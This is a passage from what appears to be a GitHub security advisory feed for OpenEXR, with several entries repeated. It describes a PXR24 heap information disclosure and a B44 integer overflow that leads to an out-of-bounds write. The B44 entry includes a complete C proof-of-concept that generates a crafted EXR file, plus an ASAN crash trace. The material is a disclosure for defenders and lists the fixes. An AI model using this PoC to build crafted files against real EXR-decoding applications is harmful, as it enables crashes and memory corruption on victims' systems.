<p>After exr_uncompress_buffer() returns success, the code does not verify whether the actual decompressed size (outSize) matches the expected size (uncompressed_size). The subsequent byte-plane reconstruction loop reads from the scratch buffer up to uncompressed_size bytes. As a result, the region between outSize and uncompressed_size consists of uninitialized heap memory, which is then read by the decoder.</p>
<p><strong>Affected component</strong></p>
<ul>
<li>src/lib/OpenEXRCore/internal_pxr24.c — undo_pxr24_impl() (line 261–399)</li>
<li>src/lib/OpenEXRCore/compression.c — exr_uncompress_buffer() (line 202–205)</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Please refer to the atta
<a href="https://github.com/user-attachments/files/26002361/poc.zip">poc.zip</a>
ched archive file and proceed after extracting it.</p>
<ol>
<li>git clone <a href="https://github.com/AcademySoftwareFoundation/openexr.git">https://github.com/AcademySoftwareFoundation/openexr.git</a></li>
<li>mv poc openexr/</li>
<li>cd openexr</li>
<li>docker build -f poc/Dockerfile -t pxr24-poc .</li>
<li>docker run --rm pxr24-poc</li>
</ol>
<img width="858" height="155" alt="스크린샷 2026-03-15 오후 4 38 18" src="https://github.com/user-attachments/assets/ded9eab6-9b92-40f7-9a0d-7b00db7e6088">


<h3 id="impact">Impact</h3>
<ul>
<li>Sensitive information from heap memory may be leaked through the decoded pixel data (information disclosure).
Trigger Condition: Occurs under default settings; simply reading a malicious EXR file is sufficient to trigger the issue, without any user interaction.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vc68-257w-m432">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vc68-257w-m432</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34543">https://nvd.nist.gov/vuln/detail/CVE-2026-34543</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/5f6d0aaa9e43802917af7db90f181e88e083d3b8">https://github.com/AcademySoftwareFoundation/openexr/commit/5f6d0aaa9e43802917af7db90f181e88e083d3b8</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8">https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8</a></li>
<li><a href="https://github.com/advisories/GHSA-vc68-257w-m432">https://github.com/advisories/GHSA-vc68-257w-m432</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc68-257w-m432</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:50:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openexr] OpenEXR: Heap information disclosure in PXR24 decompression via unchecked decompressed size (undo_pxr24_impl)]]></title>
        <id>https://github.com/advisories/GHSA-vc68-257w-m432</id>
        <link href="https://github.com/advisories/GHSA-vc68-257w-m432"/>
        <updated>2026-04-03T21:50:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The PXR24 decompression function undo_pxr24_impl in OpenEXR (internal_pxr24.c) ignores the actual decompressed size (outSize) returned by exr_uncompress_buffer() and instead reads from the scratch buffer based solely on the expected size (uncompressed_size) derived from the header metadata.</p>
<p>Additionally, exr_uncompress_buffer() (compression.c:202) treats LIBDEFLATE_SHORT_OUTPUT (where the compressed stream decompresses to fewer bytes than expected) as a successful result rather than an error.</p>
<p>When these two issues are combined, an attacker can craft a PXR24 EXR file containing a valid but truncated zlib stream. As a result, the decoder reads uninitialized heap memory and incorporates it into the output pixel data.</p>
<h3 id="details">Details</h3>
<p>This issue occurs due to the combination of two flaws.</p>
<ol>
<li>compression.c:202–205 — LIBDEFLATE_SHORT_OUTPUT treated as success</li>
</ol>
<pre><code>else if (res == LIBDEFLATE_SHORT_OUTPUT)
{
    /* TODO: is this an error? */
    return EXR_ERR_SUCCESS;
}
</code></pre>
<p>libdeflate_zlib_decompress_ex() returns LIBDEFLATE_SHORT_OUTPUT when the compressed stream is successfully decompressed but the resulting output size is smaller than the provided output buffer size. In this case, the actual number of decompressed bytes is written to actual_out. However, the function does not treat this condition as an error and instead returns success.</p>
<ol start="2">
<li>internal_pxr24.c:279–287 — outSize return value ignored</li>
</ol>
<pre><code>rstat = exr_uncompress_buffer(
    decode-&gt;context, compressed_data, comp_buf_size,
    scratch_data, scratch_size, &amp;outSize);   // outSize = actual bytes written

if (rstat != EXR_ERR_SUCCESS) return rstat;

// outSize is never referenced afterwards.
// The loop below reads the entire scratch_data buffer based on
// uncompressed_size (the header-derived expected size).
for (int y = 0; y &lt; decode-&gt;chunk.height; ++y) { ... }
</code></pre>
<p>After exr_uncompress_buffer() returns success, the code does not verify whether the actual decompressed size (outSize) matches the expected size (uncompressed_size). The subsequent byte-plane reconstruction loop reads from the scratch buffer up to uncompressed_size bytes. As a result, the region between outSize and uncompressed_size consists of uninitialized heap memory, which is then read by the decoder.</p>
<p><strong>Affected component</strong></p>
<ul>
<li>src/lib/OpenEXRCore/internal_pxr24.c — undo_pxr24_impl() (line 261–399)</li>
<li>src/lib/OpenEXRCore/compression.c — exr_uncompress_buffer() (line 202–205)</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Please refer to the atta
<a href="https://github.com/user-attachments/files/26002361/poc.zip">poc.zip</a>
ched archive file and proceed after extracting it.</p>
<ol>
<li>git clone <a href="https://github.com/AcademySoftwareFoundation/openexr.git">https://github.com/AcademySoftwareFoundation/openexr.git</a></li>
<li>mv poc openexr/</li>
<li>cd openexr</li>
<li>docker build -f poc/Dockerfile -t pxr24-poc .</li>
<li>docker run --rm pxr24-poc</li>
</ol>
<img width="858" height="155" alt="스크린샷 2026-03-15 오후 4 38 18" src="https://github.com/user-attachments/assets/ded9eab6-9b92-40f7-9a0d-7b00db7e6088">


<h3 id="impact">Impact</h3>
<ul>
<li>Sensitive information from heap memory may be leaked through the decoded pixel data (information disclosure).
Trigger Condition: Occurs under default settings; simply reading a malicious EXR file is sufficient to trigger the issue, without any user interaction.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vc68-257w-m432">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vc68-257w-m432</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34543">https://nvd.nist.gov/vuln/detail/CVE-2026-34543</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/5f6d0aaa9e43802917af7db90f181e88e083d3b8">https://github.com/AcademySoftwareFoundation/openexr/commit/5f6d0aaa9e43802917af7db90f181e88e083d3b8</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8">https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8</a></li>
<li><a href="https://github.com/advisories/GHSA-vc68-257w-m432">https://github.com/advisories/GHSA-vc68-257w-m432</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc68-257w-m432</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:50:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openexr] OpenEXR: Heap information disclosure in PXR24 decompression via unchecked decompressed size (undo_pxr24_impl)]]></title>
        <id>https://github.com/advisories/GHSA-vc68-257w-m432</id>
        <link href="https://github.com/advisories/GHSA-vc68-257w-m432"/>
        <updated>2026-04-03T21:50:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The PXR24 decompression function undo_pxr24_impl in OpenEXR (internal_pxr24.c) ignores the actual decompressed size (outSize) returned by exr_uncompress_buffer() and instead reads from the scratch buffer based solely on the expected size (uncompressed_size) derived from the header metadata.</p>
<p>Additionally, exr_uncompress_buffer() (compression.c:202) treats LIBDEFLATE_SHORT_OUTPUT (where the compressed stream decompresses to fewer bytes than expected) as a successful result rather than an error.</p>
<p>When these two issues are combined, an attacker can craft a PXR24 EXR file containing a valid but truncated zlib stream. As a result, the decoder reads uninitialized heap memory and incorporates it into the output pixel data.</p>
<h3 id="details">Details</h3>
<p>This issue occurs due to the combination of two flaws.</p>
<ol>
<li>compression.c:202–205 — LIBDEFLATE_SHORT_OUTPUT treated as success</li>
</ol>
<pre><code>else if (res == LIBDEFLATE_SHORT_OUTPUT)
{
    /* TODO: is this an error? */
    return EXR_ERR_SUCCESS;
}
</code></pre>
<p>libdeflate_zlib_decompress_ex() returns LIBDEFLATE_SHORT_OUTPUT when the compressed stream is successfully decompressed but the resulting output size is smaller than the provided output buffer size. In this case, the actual number of decompressed bytes is written to actual_out. However, the function does not treat this condition as an error and instead returns success.</p>
<ol start="2">
<li>internal_pxr24.c:279–287 — outSize return value ignored</li>
</ol>
<pre><code>rstat = exr_uncompress_buffer(
    decode-&gt;context, compressed_data, comp_buf_size,
    scratch_data, scratch_size, &amp;outSize);   // outSize = actual bytes written

if (rstat != EXR_ERR_SUCCESS) return rstat;

// outSize is never referenced afterwards.
// The loop below reads the entire scratch_data buffer based on
// uncompressed_size (the header-derived expected size).
for (int y = 0; y &lt; decode-&gt;chunk.height; ++y) { ... }
</code></pre>
<p>After exr_uncompress_buffer() returns success, the code does not verify whether the actual decompressed size (outSize) matches the expected size (uncompressed_size). The subsequent byte-plane reconstruction loop reads from the scratch buffer up to uncompressed_size bytes. As a result, the region between outSize and uncompressed_size consists of uninitialized heap memory, which is then read by the decoder.</p>
<p><strong>Affected component</strong></p>
<ul>
<li>src/lib/OpenEXRCore/internal_pxr24.c — undo_pxr24_impl() (line 261–399)</li>
<li>src/lib/OpenEXRCore/compression.c — exr_uncompress_buffer() (line 202–205)</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Please refer to the atta
<a href="https://github.com/user-attachments/files/26002361/poc.zip">poc.zip</a>
ched archive file and proceed after extracting it.</p>
<ol>
<li>git clone <a href="https://github.com/AcademySoftwareFoundation/openexr.git">https://github.com/AcademySoftwareFoundation/openexr.git</a></li>
<li>mv poc openexr/</li>
<li>cd openexr</li>
<li>docker build -f poc/Dockerfile -t pxr24-poc .</li>
<li>docker run --rm pxr24-poc</li>
</ol>
<img width="858" height="155" alt="스크린샷 2026-03-15 오후 4 38 18" src="https://github.com/user-attachments/assets/ded9eab6-9b92-40f7-9a0d-7b00db7e6088">


<h3 id="impact">Impact</h3>
<ul>
<li>Sensitive information from heap memory may be leaked through the decoded pixel data (information disclosure).
Trigger Condition: Occurs under default settings; simply reading a malicious EXR file is sufficient to trigger the issue, without any user interaction.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vc68-257w-m432">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vc68-257w-m432</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34543">https://nvd.nist.gov/vuln/detail/CVE-2026-34543</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/5f6d0aaa9e43802917af7db90f181e88e083d3b8">https://github.com/AcademySoftwareFoundation/openexr/commit/5f6d0aaa9e43802917af7db90f181e88e083d3b8</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8">https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8</a></li>
<li><a href="https://github.com/advisories/GHSA-vc68-257w-m432">https://github.com/advisories/GHSA-vc68-257w-m432</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc68-257w-m432</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:50:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openexr] OpenEXR: integer overflow to OOB write in uncompress_b44_impl()]]></title>
        <id>https://github.com/advisories/GHSA-h762-rhv3-h25v</id>
        <link href="https://github.com/advisories/GHSA-h762-rhv3-h25v"/>
        <updated>2026-04-03T21:47:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The B44/B44A decoder in OpenEXR reconstructs row pointers into a scratch buffer using int. When the channel width (nx) is large enough, the product y * nx overflows int, causing the row pointer to wrap before the start of the scratch buffer. Subsequent memcpy() calls then write decoded pixel blocks to an invalid address, producing an active out-of-bounds write.</p>
<h3 id="root-cause">Root cause</h3>
<ul>
<li>Variable declarations (internal_b44.c:535)</li>
</ul>
<pre><code class="language-c">int nx, ny;
</code></pre>
<p><code>nx</code> and <code>ny</code> are declared as plain int. They are assigned from <code>curc-&gt;width</code> and <code>curc-&gt;height</code> which are int32_t.</p>
<ul>
<li>Scratch buffer allocation (internal_b44:543)</li>
</ul>
<pre><code class="language-c">nBytes = (uint64_t) (ny) * (uint64_t) (nx) *
               (uint64_t) (curc-&gt;bytes_per_element);
</code></pre>
<p>The allocation path correctly promotes to uint64_t before multiplying.
The scratch buffer is always large enough to hold the full channel.</p>
<ul>
<li>Row pointer reconstruction (internal_b44:560)</li>
</ul>
<pre><code class="language-c">row0 = (uint16_t*) scratch;
row0 += y * nx;          
row1 = row0 + nx;
row2 = row1 + nx;
row3 = row2 + nx;
</code></pre>
<p><code>y</code> and <code>nx</code> are both int. The product <code>y * nx</code> is computed in int. If this product exceeds INT_MAX (2,147,483,647), the result is signed integer overflow</p>
<ul>
<li>Out of Band write (internal_b44:592)</li>
</ul>
<pre><code class="language-c">memcpy (row0, &amp;s[0], n);
memcpy (row1, &amp;s[4], n);
memcpy (row2, &amp;s[8], n);
memcpy (row3, &amp;s[12], n);
</code></pre>
<p>These four writes copy decoded B44 pixel blocks into row0–row3, which now point to memory before the scratch buffer. 
The same pattern is present in the encoder path (ht_apply_impl), lines 431–432, where row0–row3 are read rather than written, producing an out-of-bounds read.</p>
<h3 id="poc">PoC</h3>
<p>The PoC generates a valid B44 scanline EXR file (268435456 × 9, single HALF channel) and immediately decodes it. During decompression, uncompress_b44_impl() computes <code>row0 += y * nx</code>, with y=8 and nx=268435456, the product exceeds INT_MAX, triggering a signed integer overflow that displaces row0 before the scratch buffer. The subsequent memcpy() writes to this invalid address, causing the crash. The generated file /tmp/poc_b44.exr can be replayed independently on any OpenEXR installation.</p>
<pre><code class="language-poc.cpp">#include &lt;openexr.h&gt;
#include &lt;inttypes.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define CHECK(call)                                                  
    do {                                                             
        exr_result_t _rv = (call);                                   
        if (_rv != EXR_ERR_SUCCESS) {                                
            fprintf(stderr, "%s failed (%d)\n", #call, (int)_rv);   
            goto fail;                                               
        }                                                            
    } while (0)

static void fill_blocks(uint8_t* out, uint64_t n) {
    for (uint64_t i = 0; i &lt; n; i++, out += 3) {
        out[0] = 0x00; out[1] = 0x00; out[2] = (13u &lt;&lt; 2);
    }
}

int main(void) {
    const int64_t  W      = 268435456;
    const int64_t  H      = 9;
    const char*    path   = "/tmp/poc_b44.exr";

    const uint64_t blocks = (uint64_t)(W / 4) * 2 + 1;
    const uint64_t psz    = blocks * 3;

    uint8_t* packed = (uint8_t*) malloc(psz);
    exr_context_t         ctxt   = NULL;
    exr_context_initializer_t cinit = EXR_DEFAULT_CONTEXT_INITIALIZER;
    int                   part   = -1;
    exr_chunk_info_t      cinfo;
    exr_decode_pipeline_t dec    = EXR_DECODE_PIPELINE_INITIALIZER;
    uint16_t              dummy  = 0;
    int                   ok     = 0;

    if (!packed) { fprintf(stderr, "malloc failed\n"); return 1; }
    fill_blocks(packed, blocks);

    CHECK(exr_start_write(&amp;ctxt, path, EXR_WRITE_FILE_DIRECTLY, &amp;cinit));
    CHECK(exr_add_part(ctxt, "scan", EXR_STORAGE_SCANLINE, &amp;part));
    CHECK(exr_initialize_required_attr_simple(
              ctxt, part, (int32_t)W, (int32_t)H, EXR_COMPRESSION_B44));
    CHECK(exr_add_channel(ctxt, part, "Y", EXR_PIXEL_HALF,
                          EXR_PERCEPTUALLY_LOGARITHMIC, 1, 1));
    CHECK(exr_write_header(ctxt));
    CHECK(exr_write_scanline_chunk(ctxt, part, 0, packed, psz));
    exr_finish(&amp;ctxt); ctxt = NULL;

    fprintf(stderr, "[*] wrote %s  W=%"PRId64" H=%"PRId64 "  packed=%"PRIu64" bytes\n", path, W, H, psz);


    CHECK(exr_start_read(&amp;ctxt, path, &amp;cinit));
    CHECK(exr_read_scanline_chunk_info(ctxt, 0, 0, &amp;cinfo));
    CHECK(exr_decoding_initialize(ctxt, 0, &amp;cinfo, &amp;dec));

    dec.channels[0].decode_to_ptr          = (uint8_t*)&amp;dummy;
    dec.channels[0].user_pixel_stride      = 2;
    dec.channels[0].user_line_stride       = dec.channels[0].width * 2;
    dec.channels[0].user_bytes_per_element = 2;
    dec.channels[0].user_data_type         = dec.channels[0].data_type;

    CHECK(exr_decoding_choose_default_routines(ctxt, 0, &amp;dec));
    dec.unpack_and_convert_fn = NULL; 

    fprintf(stderr, "[*] calling exr_decoding_run()h\n");
    fflush(stderr);


    CHECK(exr_decoding_run(ctxt, 0, &amp;dec));
    ok = 1;

fail:
    if (ctxt) { exr_decoding_destroy(ctxt, &amp;dec); exr_finish(&amp;ctxt); }
    free(packed);
    return ok ? 0 : 1;
}
</code></pre>
<h3 id="asan-trace">ASAN Trace</h3>
<pre><code>openexr/src/lib/OpenEXRCore/internal_b44.c:561:23: runtime error:
    signed integer overflow: 8 * 268435456 cannot be represented in type 'int'
    #0 in uncompress_b44_impl  internal_b44.c:561
    #1 in internal_exr_undo_b44  internal_b44.c:706
    #2 in decompress_data  compression.c:444
    #3 in exr_uncompress_chunk  compression.c:541
    #4 in exr_decoding_run  decoding.c:580
    #5 in main  poc.c:83

=================================================================
==PID==ERROR: AddressSanitizer: SEGV on unknown address 0x7fe65cfbc800
==PID==The signal is caused by a WRITE memory access.
    #0 in memcpy  (libc)
    #1 in uncompress_b44_impl  internal_b44.c:599
    #2 in internal_exr_undo_b44  internal_b44.c:706
    #3 in decompress_data  compression.c:444
    #4 in exr_uncompress_chunk  compression.c:541
    #5 in exr_decoding_run  decoding.c:580
    #6 in main  poc.c:83

SUMMARY: AddressSanitizer: SEGV — WRITE via memcpy in uncompress_b44_impl internal_b44.c:599
</code></pre>
<h3 id="impact">Impact</h3>
<p>A crafted B44 or B44A EXR file can cause an out-of-bounds write in any application that decodes it via exr_decoding_run(). 
Consequences range from immediate crash (most likely) to corruption of adjacent heap allocations (layout-dependent).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-h762-rhv3-h25v">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-h762-rhv3-h25v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34544">https://nvd.nist.gov/vuln/detail/CVE-2026-34544</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/35e7aa35e22c1975606be86e859f31cc1fc598ee">https://github.com/AcademySoftwareFoundation/openexr/commit/35e7aa35e22c1975606be86e859f31cc1fc598ee</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8">https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8</a></li>
<li><a href="https://github.com/advisories/GHSA-h762-rhv3-h25v">https://github.com/advisories/GHSA-h762-rhv3-h25v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h762-rhv3-h25v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:47:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openexr] OpenEXR: integer overflow to OOB write in uncompress_b44_impl()]]></title>
        <id>https://github.com/advisories/GHSA-h762-rhv3-h25v</id>
        <link href="https://github.com/advisories/GHSA-h762-rhv3-h25v"/>
        <updated>2026-04-03T21:47:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The B44/B44A decoder in OpenEXR reconstructs row pointers into a scratch buffer using int. When the channel width (nx) is large enough, the product y * nx overflows int, causing the row pointer to wrap before the start of the scratch buffer. Subsequent memcpy() calls then write decoded pixel blocks to an invalid address, producing an active out-of-bounds write.</p>
<h3 id="root-cause">Root cause</h3>
<ul>
<li>Variable declarations (internal_b44.c:535)</li>
</ul>
<pre><code class="language-c">int nx, ny;
</code></pre>
<p><code>nx</code> and <code>ny</code> are declared as plain int. They are assigned from <code>curc-&gt;width</code> and <code>curc-&gt;height</code> which are int32_t.</p>
<ul>
<li>Scratch buffer allocation (internal_b44:543)</li>
</ul>
<pre><code class="language-c">nBytes = (uint64_t) (ny) * (uint64_t) (nx) *
               (uint64_t) (curc-&gt;bytes_per_element);
</code></pre>
<p>The allocation path correctly promotes to uint64_t before multiplying.
The scratch buffer is always large enough to hold the full channel.</p>
<ul>
<li>Row pointer reconstruction (internal_b44:560)</li>
</ul>
<pre><code class="language-c">row0 = (uint16_t*) scratch;
row0 += y * nx;          
row1 = row0 + nx;
row2 = row1 + nx;
row3 = row2 + nx;
</code></pre>
<p><code>y</code> and <code>nx</code> are both int. The product <code>y * nx</code> is computed in int. If this product exceeds INT_MAX (2,147,483,647), the result is signed integer overflow</p>
<ul>
<li>Out of Band write (internal_b44:592)</li>
</ul>
<pre><code class="language-c">memcpy (row0, &amp;s[0], n);
memcpy (row1, &amp;s[4], n);
memcpy (row2, &amp;s[8], n);
memcpy (row3, &amp;s[12], n);
</code></pre>
<p>These four writes copy decoded B44 pixel blocks into row0–row3, which now point to memory before the scratch buffer. 
The same pattern is present in the encoder path (ht_apply_impl), lines 431–432, where row0–row3 are read rather than written, producing an out-of-bounds read.</p>
<h3 id="poc">PoC</h3>
<p>The PoC generates a valid B44 scanline EXR file (268435456 × 9, single HALF channel) and immediately decodes it. During decompression, uncompress_b44_impl() computes <code>row0 += y * nx</code>, with y=8 and nx=268435456, the product exceeds INT_MAX, triggering a signed integer overflow that displaces row0 before the scratch buffer. The subsequent memcpy() writes to this invalid address, causing the crash. The generated file /tmp/poc_b44.exr can be replayed independently on any OpenEXR installation.</p>
<pre><code class="language-poc.cpp">#include &lt;openexr.h&gt;
#include &lt;inttypes.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define CHECK(call)                                                  
    do {                                                             
        exr_result_t _rv = (call);                                   
        if (_rv != EXR_ERR_SUCCESS) {                                
            fprintf(stderr, "%s failed (%d)\n", #call, (int)_rv);   
            goto fail;                                               
        }                                                            
    } while (0)

static void fill_blocks(uint8_t* out, uint64_t n) {
    for (uint64_t i = 0; i &lt; n; i++, out += 3) {
        out[0] = 0x00; out[1] = 0x00; out[2] = (13u &lt;&lt; 2);
    }
}

int main(void) {
    const int64_t  W      = 268435456;
    const int64_t  H      = 9;
    const char*    path   = "/tmp/poc_b44.exr";

    const uint64_t blocks = (uint64_t)(W / 4) * 2 + 1;
    const uint64_t psz    = blocks * 3;

    uint8_t* packed = (uint8_t*) malloc(psz);
    exr_context_t         ctxt   = NULL;
    exr_context_initializer_t cinit = EXR_DEFAULT_CONTEXT_INITIALIZER;
    int                   part   = -1;
    exr_chunk_info_t      cinfo;
    exr_decode_pipeline_t dec    = EXR_DECODE_PIPELINE_INITIALIZER;
    uint16_t              dummy  = 0;
    int                   ok     = 0;

    if (!packed) { fprintf(stderr, "malloc failed\n"); return 1; }
    fill_blocks(packed, blocks);

    CHECK(exr_start_write(&amp;ctxt, path, EXR_WRITE_FILE_DIRECTLY, &amp;cinit));
    CHECK(exr_add_part(ctxt, "scan", EXR_STORAGE_SCANLINE, &amp;part));
    CHECK(exr_initialize_required_attr_simple(
              ctxt, part, (int32_t)W, (int32_t)H, EXR_COMPRESSION_B44));
    CHECK(exr_add_channel(ctxt, part, "Y", EXR_PIXEL_HALF,
                          EXR_PERCEPTUALLY_LOGARITHMIC, 1, 1));
    CHECK(exr_write_header(ctxt));
    CHECK(exr_write_scanline_chunk(ctxt, part, 0, packed, psz));
    exr_finish(&amp;ctxt); ctxt = NULL;

    fprintf(stderr, "[*] wrote %s  W=%"PRId64" H=%"PRId64 "  packed=%"PRIu64" bytes\n", path, W, H, psz);


    CHECK(exr_start_read(&amp;ctxt, path, &amp;cinit));
    CHECK(exr_read_scanline_chunk_info(ctxt, 0, 0, &amp;cinfo));
    CHECK(exr_decoding_initialize(ctxt, 0, &amp;cinfo, &amp;dec));

    dec.channels[0].decode_to_ptr          = (uint8_t*)&amp;dummy;
    dec.channels[0].user_pixel_stride      = 2;
    dec.channels[0].user_line_stride       = dec.channels[0].width * 2;
    dec.channels[0].user_bytes_per_element = 2;
    dec.channels[0].user_data_type         = dec.channels[0].data_type;

    CHECK(exr_decoding_choose_default_routines(ctxt, 0, &amp;dec));
    dec.unpack_and_convert_fn = NULL; 

    fprintf(stderr, "[*] calling exr_decoding_run()h\n");
    fflush(stderr);


    CHECK(exr_decoding_run(ctxt, 0, &amp;dec));
    ok = 1;

fail:
    if (ctxt) { exr_decoding_destroy(ctxt, &amp;dec); exr_finish(&amp;ctxt); }
    free(packed);
    return ok ? 0 : 1;
}
</code></pre>
<h3 id="asan-trace">ASAN Trace</h3>
<pre><code>openexr/src/lib/OpenEXRCore/internal_b44.c:561:23: runtime error:
    signed integer overflow: 8 * 268435456 cannot be represented in type 'int'
    #0 in uncompress_b44_impl  internal_b44.c:561
    #1 in internal_exr_undo_b44  internal_b44.c:706
    #2 in decompress_data  compression.c:444
    #3 in exr_uncompress_chunk  compression.c:541
    #4 in exr_decoding_run  decoding.c:580
    #5 in main  poc.c:83

=================================================================
==PID==ERROR: AddressSanitizer: SEGV on unknown address 0x7fe65cfbc800
==PID==The signal is caused by a WRITE memory access.
    #0 in memcpy  (libc)
    #1 in uncompress_b44_impl  internal_b44.c:599
    #2 in internal_exr_undo_b44  internal_b44.c:706
    #3 in decompress_data  compression.c:444
    #4 in exr_uncompress_chunk  compression.c:541
    #5 in exr_decoding_run  decoding.c:580
    #6 in main  poc.c:83

SUMMARY: AddressSanitizer: SEGV — WRITE via memcpy in uncompress_b44_impl internal_b44.c:599
</code></pre>
<h3 id="impact">Impact</h3>
<p>A crafted B44 or B44A EXR file can cause an out-of-bounds write in any application that decodes it via exr_decoding_run(). 
Consequences range from immediate crash (most likely) to corruption of adjacent heap allocations (layout-dependent).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-h762-rhv3-h25v">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-h762-rhv3-h25v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34544">https://nvd.nist.gov/vuln/detail/CVE-2026-34544</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/35e7aa35e22c1975606be86e859f31cc1fc598ee">https://github.com/AcademySoftwareFoundation/openexr/commit/35e7aa35e22c1975606be86e859f31cc1fc598ee</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8">https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8</a></li>
<li><a href="https://github.com/advisories/GHSA-h762-rhv3-h25v">https://github.com/advisories/GHSA-h762-rhv3-h25v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h762-rhv3-h25v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:47:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openexr] OpenEXR: integer overflow to OOB write in uncompress_b44_impl()]]></title>
        <id>https://github.com/advisories/GHSA-h762-rhv3-h25v</id>
        <link href="https://github.com/advisories/GHSA-h762-rhv3-h25v"/>
        <updated>2026-04-03T21:47:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The B44/B44A decoder in OpenEXR reconstructs row pointers into a scratch buffer using int. When the channel width (nx) is large enough, the product y * nx overflows int, causing the row pointer to wrap before the start of the scratch buffer. Subsequent memcpy() calls then write decoded pixel blocks to an invalid address, producing an active out-of-bounds write.</p>
<h3 id="root-cause">Root cause</h3>
<ul>
<li>Variable declarations (internal_b44.c:535)</li>
</ul>
<pre><code class="language-c">int nx, ny;
</code></pre>
<p><code>nx</code> and <code>ny</code> are declared as plain int. They are assigned from <code>curc-&gt;width</code> and <code>curc-&gt;height</code> which are int32_t.</p>
<ul>
<li>Scratch buffer allocation (internal_b44:543)</li>
</ul>
<pre><code class="language-c">nBytes = (uint64_t) (ny) * (uint64_t) (nx) *
               (uint64_t) (curc-&gt;bytes_per_element);
</code></pre>
<p>The allocation path correctly promotes to uint64_t before multiplying.
The scratch buffer is always large enough to hold the full channel.</p>
<ul>
<li>Row pointer reconstruction (internal_b44:560)</li>
</ul>
<pre><code class="language-c">row0 = (uint16_t*) scratch;
row0 += y * nx;          
row1 = row0 + nx;
row2 = row1 + nx;
row3 = row2 + nx;
</code></pre>
<p><code>y</code> and <code>nx</code> are both int. The product <code>y * nx</code> is computed in int. If this product exceeds INT_MAX (2,147,483,647), the result is signed integer overflow</p>
<ul>
<li>Out of Band write (internal_b44:592)</li>
</ul>
<pre><code class="language-c">memcpy (row0, &amp;s[0], n);
memcpy (row1, &amp;s[4], n);
memcpy (row2, &amp;s[8], n);
memcpy (row3, &amp;s[12], n);
</code></pre>
<p>These four writes copy decoded B44 pixel blocks into row0–row3, which now point to memory before the scratch buffer. 
